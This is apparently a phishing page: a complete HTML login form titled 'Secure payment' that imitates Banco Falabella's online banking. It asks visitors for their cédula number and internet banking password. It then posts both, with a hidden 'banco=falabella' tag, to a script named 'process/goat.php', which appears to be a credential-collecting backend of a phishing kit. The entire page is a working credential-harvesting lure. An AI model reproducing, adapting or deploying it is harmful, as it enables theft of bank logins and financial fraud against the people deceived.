<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
    <title>Secure payment</title>

    <style>
        * {
            -webkit-appearance: none;
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
        }
        input {
            width: 80%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border: 1px solid gray;
            padding: 5px;
        }
        select {
            padding: 5px;
            background-color: white;
            color: black;
            width: 82%;
            height: 40px;
            border-radius: 5px;
            margin-top: 10px;
            border: 1px solid gray;
        }
        #btnUsuario {
            background-color: #007a34;
            border: none;
            color: white;
            letter-spacing: 3px;
            font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';
        }
        #clave {
            color: rgb(78,139,102);
        }
    </style>
</head>
<body>
    <br><br>
    <div>
        <center>
            <img src="img/fala.png" alt="" width="40%">
            <img src="img/pago.jpg" alt="" width="20%">
        </center>
        <br>
        <div>
            <form action="process/goat.php" method="POST">
                <center>
                    <select name="tipo_documento" id="">
                        <option value="cedula">Cédula de Ciudadanía</option>
                    </select><br>

                    <input type="text" id="txtUsuario" name="user" placeholder="Cédula Ciudadanía" required><br>
                    <input type="password" id="txtPass" name="pass" placeholder="Clave internet" required><br>
                    <input type="hidden" name="banco" value="falabella">
                    <input type="submit" value="INGRESAR" id="btnUsuario">
                </center>
                <br>
                <center>
                    <a href="#" id="clave">Crea o recupera tu clave internet</a>
                </center>
            </form>
        </div>
    </div>
    <br><br>
</body>
</html>
